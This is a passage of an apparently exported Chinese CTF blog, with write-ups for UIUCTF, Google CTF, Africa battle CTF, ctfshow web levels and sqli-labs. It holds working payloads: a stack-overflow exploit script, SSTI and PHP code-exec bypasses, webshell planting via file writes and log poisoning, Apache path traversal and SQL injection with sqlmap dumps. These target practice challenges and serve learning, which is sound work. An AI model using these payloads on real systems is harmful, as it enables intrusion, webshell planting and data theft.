359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713\nn = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689\nc = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869\nd=inverse(e,n)\nflag=(c*d)%n\nprint(long_to_bytes(flag))\n~~~\n\n# PWN\n\n## Chainmail            \n\n一个基础的栈溢出，跳到give_flag的函数即可，但要注意的是在发送give_flag的地址之前要再给他发送一个`ret`的地址，否则会造成错误的对齐。`ret`的地址可以用`ROPgadget `找，命令:`ROPgadget --binary chal --only  'ret'`。\n\nexp：\n\n~~~python\nfrom pwn import *\na = remote(\"chainmail.chal.uiuc.tf\", 1337)\npayload=b'a'*72 +p64(0x40101a) + p64(0x401216)\na.sendline(payload)\na.interactive()\n~~~\n\n# WEB\n\n## peanut-xss\n\nXSS学的不是很好，具体怎么解可以看下面的文章:\n\nhttps://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss\n","tags":["ctf"],"categories":["ctf"]},{"title":"Google-CTF2023","url":"/2023/06/29/Google-CTF2023/","content":"\n# MISC\n\n## PAPAPAPA\n\n下载下来附件是一张全白的图片，通过修改jpg的宽高获得flag\n\n![](/pic/googlectf/papapa.png)\n\n从`FF`到`01`中间，修改成`FF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01`\n\n右边就是flag\n\n# WEB\n\n## UNDER-CONSTRUCTION\n\n给了一个flask和一个php的服务，没有办法ssti注入\n\n~~~php\nfunction getResponse()\n{\n    if (!isset($_POST['username']) || !isset($_POST['password'])) {\n        return NULL;\n    }\n\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    if (!is_string($username) || !is_string($password)) {\n        return \"Please provide username and password as string\";\n    }\n\n    $tier = getUserTier($username, $password);\n\n    if ($tier === NULL) {\n        return \"Invalid credentials\";\n    }\n\n    $response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";\n\n    if ($tier === \"gold\") {\n        $response .= \" \" . getenv(\"FLAG\");\n    }\n\n    return $response;\n}\n~~~\n\n通过代码分析，在php的服务上，只要让`tier=gold`就输出flag。\n\n可以在注册账号的时候传两个tier。\n\nflask识别第一个tier，php识别第二个tier，注册完后在php服务登录得到falg。\n\n\n\n\n\n其他的太难了，看都看不懂\n\nhttp://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/\n\n可以看这个\n","tags":["ctf"],"categories":["ctf"]},{"title":"Africa battle CTF","url":"/2023/06/26/Africa-battle-CTF/","content":"\n# WEB\n\n## Civilization\n\n```php\n<?php\nrequire(\"./flag.php\");\nif(isset($_GET['source'])){\n    highlight_file(__FILE__);  \n}\nif(isset($_GET['ami'])){\n    $input = $_GET['ami'];\n    $cigar = 'africacradlecivilization';\n    if (preg_replace(\"/$cigar/\",'',$input) === $cigar) {\n        africa();\n    }\n}\ninclude(\"home.html\");\n?> \n```\n\n?source得到这个，这个只用双写就可以绕过。\n\npayload:\n\n~~~\n?ami=africacradlecafricacradlecivilizationivilization\n~~~\n\n## Cobalt Injection \t\t\t\t\t\n\n在源代码里有\n\n`<!-- IP?capital=Benin -->`\n\n![](/pic/Africa/8085.png)\n\n可知存在ssti模板注入。没有过滤。\n\npayload:\n\n~~~\n?capital={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag.txt').read()}}\n~~~\n\n当然看别人的WP，要长脑子了\n\n~~~\n?capital={{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}\n~~~\n\n#request.application：表示当前请求的应用程序对象。\n\n~~~\n?capital={{().__class__.__base__.__subclasses__()[354]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip()}}\n~~~\n\n这个还没搞明白，搞明白了再回来修改。\n\n## Fâ\n\n访问?source\n\n~~~php\n<?php\n    include(\"flag.php\");\n\n    if(isset($_GET['source'])){\n        highlight_file(__FILE__);\n    }\n    \n    class africa {\n        var $boknn;\n        var $du;\n    }\n   \n    if (isset($_GET['fa'])) {\n        $vodoo = $_GET['fa'];\n       \n        $fa = unserialize($vodoo);\n       \n        if ($fa) {\n            $fa->du=$flag;\n            if ($fa->du === $fa->boknn)\n                echo \"Congratulation! You've got the best interpretation: <b>\".$fa->du.\"</b>\";\n            else\n                echo \"Oh no...\";\n        }\n        else echo \"you dey smoke igbo?\";\n    }\n    include(\"home.html\");\n\n?> \n~~~\n\n反序列化，只要将传入的fa值和$du相等就可以输出flag。\n\npayload:\n\n~~~\n?fa=O:6:\"africa\":2:{s:5:\"boknn\";N;s:2:\"du\";R:2;}\n~~~\n\n其中，boknn的值为NULL，du的值通过R引用了编号为2的值，\n\n![](/pic/Africa/8084.png)\n\nboknn的编号就为2。\n\n具体的可以看:https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html\n\n## Own reality \t\t\t\t\t\n\n真是让我长见识了。\n\n首先是.git泄露\n\n用wget将网站下载下来\n\n `wget http://chall.battlectf.online:8082/.git/ -mirror\n\n使用 `--mirror` 选项你可以下载整个站点，包括它的目录结构。\n\n然后用git reflog查看历史版本，之后用git cherry-pick '你想要恢复的'\n\n会出来一个flag.txt,尾部有\n\n~~~\n.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._\n~~~\n\n二进制转换为字符就是flag\n\n## It shock you \t\t\t\t\t\n\n先用whatweb看网站，\n\n![](/pic/Africa\\8083.1.png)\n\n可以看到apache的版本，去网上找相对应的漏洞能找到，目录穿越\n\nPOC:\n\n~~~\n\nGET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1\nHost: chall.battlectf.online:8083\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nCookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMT\nIf-None-Match: \"b6d-5fd772fd55940\"\n\n~~~\n\n## Africa\n\n`Warning: This site is only for africa people.`\n\n在bp中将`User-Agent`改为`africa`\n\n`     Warning: Go away! Attacker! This page is only for local client!`\n\n用`X-Forwarded-For`伪造127.0.0.1\n\n`Warning: I don't trust users who are not from battlectf.online`\n\n用`Referer`绕过得到flag。\n\n# Crypto\n\n## Back To Origin\n\n埃及象形文\n\nhttps://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf\n\n可以参考上面的链接\n\n## Blind\n\nhttps://gchq.github.io/CyberChef/\n\n首先是`magic`解码，然后 `braille`,解码得到flag\n\n## ROCYOU\n\n`factordb`和`yafu`分解不出来，看别人的博客知道有`ROCA漏洞`，可以从公钥中提取私钥\n\n工具：\n\nhttps://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca\n\n一开始运行要给权限\n\n![](/pic/Africa/rock.png)\n\n可以用在线的rsa解密工具：https://www.dcode.fr/chiffre-rsa\n\n~~~\np=127801155916875524149457561567678575565270601000365665873572024750823913157383\nq=113917064871970833547038329106470040388258358281464605006613652518914797349747\n~~~\n\n## goose\n\n首先给了5个随机数，然后将falg的每个字符通过`res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)`进行加密。\n\nflag的前几个字符是知道的，可以列方程组计算一下a,b,c,d,e的值\n\n~~~\n184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164\n177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541\n362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988\n362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988\n272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124\n208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193\n~~~\n\n解得：\n\n~~~\na=6709636436\nb=7748795321\nc=7386429784\nd=62359624\ne=5008041292\n~~~\n\n然后写代码爆破:\n\n~~~python\nflag = ''\na=6709636436\nb=7748795321\nc=7386429784\nd=62359624\ne=5008041292\ntab=[1245115057305148164, 1195140205147730541, 2441940832124642988, 2441940832124642988, 1835524676869638124, 1404473868033353193, 272777109172255911, 672752034376118188, 324890781330979572, 3086023531811583439, 475309634185807521, 1195140205147730541, 2441940832124642988, 1578661367846445708, 2358921859155462327, 1099718459319293547, 773945458916291731, 78288818574073053, 2441940832124642988, 1578661367846445708, 1099718459319293547, 343816904985468003, 1195140205147730541, 2527132076695959961, 2358921859155462327, 2358921859155462327, 1099718459319293547, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 3291439457645322417]\n\ndef encrypt(x):\n    return (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)\nfor val in tab:\n    for i in range(32,126):\n        if(encrypt(chr(i))==val):\n            flag+=chr(i)\n            print(flag)\n\n~~~\n\n\n\n# RE\n\n## seyi\n\nida64位打开,flag在getshell里面。\n\n## welcome\n\n![](/pic/Africa/welcome.png)\n\n重点就是这个，\n\nadd就是加，\n\nxor就是异或。\n\n很简单的一个表达式。\n\n~~~python\nfrom Crypto.Util.number import *\na = 0x522D1B20F6\nb = 0x1EE2EEEE\nc = a+b\nd = 0x0AA84AAA\nflag = c^d\nflag = long_to_bytes(flag)\nprint(flag)\n~~~\n\n## Infinity\n\n![](/pic/Africa/in.png)\n\n找到汇编代码里所有的push，然后将值转换一下\n\n~~~python\nfrom pwn import *\na=\t[p64(0x5F4F7572),\n\tp64(0x6C654354),\n\tp64(0x467B4265),\n\tp64(0x796F6E64),\n\tp64(0x62617474),\n\tp64(0x47616C61),\n\tp64(0x7869657D)]\nfor c in a:\n\tprint(c)\n\n~~~\n\n~~~\nb'ruO_\\x00\\x00\\x00\\x00'\nb'TCel\\x00\\x00\\x00\\x00'\nb'eB{F\\x00\\x00\\x00\\x00'\nb'dnoy\\x00\\x00\\x00\\x00'\nb'ttab\\x00\\x00\\x00\\x00'\nb'alaG\\x00\\x00\\x00\\x00'\nb'}eix\\x00\\x00\\x00\\x00'\n~~~\n\n然后将这些反转一下删掉多余的东西\n\n~~~\n_Our\nleCT\nF{Be\nbatt\nGala\nxie}\nyond\n~~~\n\n最后将这些拼接一下，`battleCTF{Beyond_OurGalaxie} `。\n\n## babyrev\n\n用ida打开，查询字符串能发现`qpiiatRIU{Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46}`，然后凯撒解密得到flag\n\n## checker\n\n和上一题基本上差不多\n\n`gfyyqjHYK{Flg4_d0z_i3d_xr0p3_1lg0?}`然后凯撒解密\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"ctfshow web入门126~150","url":"/2023/03/18/ctfshow-web入门126/","content":"# web126\n与web125差不多\n~~~\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n~~~\n# web127\n绕过方式和web123一样。\npayload：\n~~~\n?ctf show=ilove36d\n~~~\n# web128\n![](/pic/128.png)\n考察点：gettext拓展的使用\n在开启该拓展后 _() 等效于 gettext()\npayload:\n~~~\n?f1=_&f2=get_defined_vars\n~~~\n# web129\n![](/pic/129.png)\n~~~\nstripos(string,find,start)\n返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE。注释：字符串位置从0开始，不是从1开始\n~~~\n看别人的wp绕过的姿势有很多啊，但是怎么一到我这里就失灵了啊。只能用php伪协议\npayload:\n~~~\n?f=php://filter/|ctfshow/resource=flag.php   #也可以用其他的过滤器\n~~~\n# web130\n![](/pic/130.png)\n[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)\n~~~\nimport requests\n\nurl='#url'\ndata={\n    'f':'a'*1000000+'ctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n~~~\n或者\n数组绕过\n~~~\nf[]=1   #stripos应用于数组的时候会返回null，null!==false\n~~~\n或者\n~~~\nf=ctfshow\n~~~\n/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了。\n# web131\n~~~\nimport requests\n\nurl='#url'\ndata={\n    'f':'a'*1000000+'36Dctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n~~~\n# web132\n![](/pic/132.png)\n一打开网站我都惊呆了，好高级的感觉。然后访问robots.txt有/admin访问就能看到源码。\n![](/pic/132.1.png)\n啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n这一题好简单啊。\n~~~\n$code === mt_rand(1,0x36D) && $password === $flag\n~~~\n只要让这个为false，username=admin和code=admin就行\npayload：\n~~~\n?username=admin&code=admin&password=1\n~~~\n# web134\n![](/pic/134.png)\nparse_str()函数\n~~~\n把查询字符解析到变量\n~~~\nectract()函数\n~~~\n从数组中将变量导入当前的符号表\n~~~\n~~~\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n~~~\n~~~\n四个变量的介绍：\n\n1.$_SERVER[\"QUERY_STRING\"]\n\n说明：查询(query)的字符串\n\n2.$_SERVER[\"REQUEST_URI\"]\n\n说明：访问此页面所需的URI\n　　\n3.$_SERVER[\"SCRIPT_NAME\"]\n\n说明：包含当前脚本的路径\n　　\n4.$_SERVER[\"PHP_SELF\"]\n~~~\n例如\n~~~\nhttp://www.xxx.com/?p=222 (附带查询)\n结果：\n$_SERVER[\"QUERY_STRING\"]==>“p=222”;\n\n$_SERVER[\"REQUEST_URI\"] ==>\"/?p=222\";\n\n$_SERVER[\"SCRIPT_NAME\"] ==>\"/index.php\";\n\n$_SERVER[\"PHP_SELF\"] ==>\"/index.php\";\n~~~\npayload:\n~~~\n?_POST[key1]=36d&_POST[key2]=36d\n~~~\n# web136\n![](/pic/136.png)\n跟着大佬学到了好多啊\n在linux里可以用tee命令读取标准输入的数据，并将其内容输出成文件\npayload:\n~~~\n?c=ls /|tee 1 #把根目录里的内容写进1文件里\n?c=tac /f149_15_h3r3|tee 2\n~~~\n# web137\n![](/pic/137.png)\n~~~\ncall_user_func — 把第一个参数作为回调函数调用\n~~~\n考察调用类中的函数\n~~~\nphp中 ->与:: 调用类中的成员的区别\n->用于动态语境处理某个类的某个实例\n::可以调用一个静态的、不依赖于其他初始化的类方法.\n~~~\npayload:\n~~~\nPOST:ctfshow=ctfshow::getFlag\n~~~\n# web138\n![](/pic/138.png)\n相当于把冒号禁用了，但是call_user_func还可以传数组\n第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。\npayload:\n~~~\nPOST:ctfshow[0]=ctfshow&ctfshow[1]=getFlag\n~~~\n# web139\n太难了，脚本看不懂，以后有机会了再做\n# web140\n![](/pic/140.png)\n可以看到只要我们让intval($code)为0就可以了\nintval会将非数字字符转换为0，也就是说 intval('a')==0 intval('.')==0 intval('/')==0\n所以方法就挺多了\n![](/pic/140.1.png)\npayload：\n~~~\nf1=chr&f2=chr\n~~~\n我感觉随便搞一点函数放上去都可以。\n# web141\n![](/pic/141.png)\n传入的v3必须是非单词字符\n[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）](https://blog.csdn.net/miuzzx/article/details/109143413)\npayload：\n~~~\n?v1=1&v2=1&v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)-\n~~~\n# web142\n![](/pic/142.png)\nemmmmmmmmmmmm，让我太奶来都会做\npayload:\n~~~\n?v1=0\n~~~\n# web143\n![](/pic/143.png)\n~~~\n?v1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n~~~\n# web144\n![](/pic/144.png)\n对v3的长度进行了限制,所以在v2上下手\npayload:\n~~~\n?v1=1&v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&v3=1\n~~~\n# web145\n![](/pic/145.png)\n可以用三目运算符\n~~~\neval(\"return 1?phpinfo():1;\"); #这是可以运行的\n~~~\npayload:\n~~~\n?v1=1&v2=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):\n~~~\n# web146\n过滤了：没办法用三目运算符，可以用等号和位运算符\\\n~~~\neval(\"return 1==phpinfo()||1;\");  #这也可以运行\n~~~\npayload:\n~~~\n?v1=1&v2=1&v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||\n~~~\n# web147\n![](/pic/147.png)\n[具体原理看这个](https://paper.seebug.org/755/)\n~~~\ncreate_function('$a','echo $a.\"123\"')\n\n类似于\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n~~~\npayload:\n~~~\nGET:?show=}system(\"tac flag.php\");/*\nPOST:ctf=\\create_function\n~~~\n# web148\n![](/pic/148.png)\n没过滤异或还可以用异或\npayload:\n~~~\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%0c%01%07%01%0b%08%0b\"^\"%7d%60%60%21%60%60%60%60%2f%7b%60%7b\");\n~~~\n# web149\n![](/pic/149.png)\n预期解是条件竞争，可是我搞了半天也不行，就直接在index.php里改了\npayload:\n~~~\nGET: ?ctf=index.php\nPOST: show=<?php @eval($_POST[a];)?>\n~~~\n然后用蚁剑连接。\n# web150\n~~~\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n} \n~~~\n非预期\n日志文件包含写一句话\n修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。\n首先访问index.php 修改user_agent为<?php eval($_POST['a']);?>\n![](/pic/150.png)\n\n","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门110~125","url":"/2023/03/17/ctfshow-web入门110/","content":"# web110\n![](/pic/110.png)\n考察FilesystemIterator。getcwd()函数 获取当前工作目录 返回当前工作目录。\npayload:\n~~~\n?v1=FilesystemIterator&v2=getcwd\n~~~\n缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。\n<!--more-->\n# web111\n![](/pic/111.png)\n考察 全局变量GLOBALS\n![](/pic/111.1.png)\n要执行这一段函数，v1要等于ctfshow\n~~~\nif(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    } \n~~~\n然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag。\npayload:\n~~~\n?v1=ctfshow&v2=GLOBALS\n~~~\n# web112\n![](/pic/112.png)\npayload:\n~~~\nphp://filter/resource=flag.php\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\nphp://filter/read=convert.quoted-printable-encode/resource=flag.php\ncompress.zlib://flag.php\n~~~\n[php://filter的各种过滤器](https://blog.csdn.net/qq_44657899/article/details/109300335)\n# web113\n![](/pic/113.png)\npayload:\n可以用zlib伪协议\n~~~\n?file=compress.zlib://flag.php\n~~~\n也可以用/proc/self/root\n~~~\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\nroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\nself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\nlf/root/proc/self/root/var/www/html/flag.php\n~~~\n[proc目录的应用](https://blog.csdn.net/cosmoslin/article/details/122660083)\n![](/pic/114.png)\ncompress，和非预期都被禁了，但是伪协议放出来了，可以直接使用伪协议读\npayload:\n~~~\n?file=php://filter/resource=flag.php\n~~~\n# web115\n![](/pic/115.png)\n考察点：trim函数的绕过+is_numeric绕过\n~~~\n语法\ntrim(string,charlist)\n\n参数\t描述\nstring\t        必需。规定要检查的字符串。\ncharlist\t    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：\n\n\"\\0\"       - NULL\n\"\\t\"       - 制表符\n\"\\n\"       - 换行\n\"\\x0B\"     - 垂直制表符\n\"\\r\"       - 回车\n\" \"        - 空格\n~~~\n看师傅的wp才能做出来，在本地测试一下\n~~~\n<?php\n\nfor($i=0;$i<=128;$i++){\n    $str=chr($i).\"1\";\n    if(is_numeric($str)&& trim($str)!=='1'){\n        echo urlencode(chr($i)).\"<br>\";\n    }\n}\n~~~\n可以用%0c换页，\npayload:\n~~~\n?num=%0c36\n~~~\n# web123\n![](/pic/123.png)\n~~~\nGET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_,想构造出.，需要前面带上[，后面用.就可以不变成_。\n~~~\n\npayload:\n~~~\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag\n~~~\n# web125\n![](/pic/125.png)\n~~~\n1、cli模式（命令行）下\n\n\t第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n\n2、web网页模式下\n\n\t在web页模式下必须在php.ini开启register_argc_argv配置项\n\t\n    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n\n    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n\n    $argv,$argc在web模式下不适用\n~~~\npayload:\n~~~\npayload:\nget:  $fl0g=flag_give_me;\npost:  CTF_SHOW=1&CTF%5bSHOW.COM=1&fun=eval($a[0])\n~~~","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门105~109","url":"/2023/02/26/ctfshow-web入门105/","content":"![](/pic/105.png)\n~~~\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    } \n~~~\n这一段说get传的值不能等于error。\n~~~\nforeach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    } \n~~~\n这一段说POST传的值不能等于flag。\n~~~\nif(!($_POST['flag']==$flag)){\n    die($error);\n} \n~~~\n这一段说POST传的值不等于flag的话输出变量error。\npayload:\n~~~\nGET:?a=flag\nPOST:error=a\n~~~\n<!--more-->\n# web106\n![](/pic/106.png)\n这道题就比web105多一个比较。\npayload:\n~~~\nGET:v2[]=1\nPOST:v1[]=2\n~~~\n# web107\n![](/pic/107.png)\n~~~\nparse_str(string,array)\n把查询字符串解析到变量中。\nstring必选。规定要解析的字符串\narray可选。规定存储变量的数组的名称。\n~~~\n题目就是把v1的值赋给v2，然后让v2的值和v3的MD5值相同。\npayload:\n~~~\nGET:?v3=a\nPOST:v1=flag=0cc175b9c0f1b6a831c399e269772661\n~~~\nMD5没办法处理数组。\n~~~\nGET:?v3=a\nPOST:v1=   #空\n~~~\n# web108\n连接不到服务器.....\n# web109\n找不到服务器......","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"Hello World","url":"/2023/02/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"},{"title":"sqli-labs","url":"/2023/02/20/sqli-labs/","content":"# less-1\n![](/pic/sqli/1.png)\n看报错可知，这是闭合单引号。\n~~~\n?id=1'order by 3 -- - #确定那个字段有回显\n?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- - #查询表名\n?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- -  #查询列名\n?id=-1'union select 1,2,group_concat(username,'~',password) from users -- - #查询当前数据库user表里面的username和password。\n~~~\n<!--more-->\n用sqlmap更简单\n~~~\nsqlmap -u \"ip?id=1\"\nsqlmap -u \"ip?id=1\" -dbs #列出所有数据库\nsqlmap -u \"ip?id=1\" -D security -tables #列出当前数据库里的表\nsqlmap -u \"ip?id=1\" -D security -T users -columns #列出表里的列\nsqlmap -u \"ip?id=1\" -D security -T users -C username,password --dump #获取表里的数据\n~~~\n# less-2\n![](/pic/sqli/2.png)\n这一题就不用闭合，剩下的和第一题一样。\n~~~\n?id=1 order by 3 -- - \n?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1 union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-3\n![](/pic/sqli/3.png)\n看错误提示可知，需要用`')`来闭合，剩下的和第一题一样。\n~~~\n?id=1') order by 3 -- - \n?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1') union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-4\n![](/pic/sqli/4.png)\n看错误提示，可知闭合方式是`\")`，但是单引号不会报错,剩下的和第一题一样。\n~~~\n?id=1\") order by 3 -- - \n?id=-1\") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1\") union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1\") union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-5\n![](/pic/sqli/5.png)\n根据错误可以判断是单引号报错。联合注入也没有办法用，可以使用报错注入。\nextractvalue函数\npayload:id='and(select extractvalue(\"anything\",concat('~',(select语句))))\n~~~\n函数原型：extractvalue(xml_document,Xpath_string)\n正常语法：extractvalue(xml_document,Xpath_string);\n第一个参数：xml_document是string格式，为xml文档对象的名称\n第二个参数：Xpath_string是xpath格式的字符串\n作用：从目标xml中返回包含所查询值的字符串\n~~~\npayload：\n~~~\n?id=-1'and (select extractvalue(1,concat(\"~\",(select database()))))-- - #获取当前数据库的名称\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -\n#查询当前数据库里所有的表\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,31))))-- -\n#查询表里列的名称\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(username,'~',password) from users),1,31))))-- -\n#查询表里面的内容\n\n\n\n# extractvalue()函数能显示的最大长度为32，所以用substr()函数来分页，或者使用limit分页也可以。concat()里面的~也可以是其他的。\n~~~\n\nupdatexml:\npayload:id='and(select updatexml(\"anything\",concat('~',(select语句())),\"anything\"))\n~~~\n?id=-1'and updatexml(1,concat('~',(select database())),1)-- -\n?id=-1'and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -\n?id=-1'and updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users' )),1)-- -\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(username,'~',password) from users),1,31))))-- 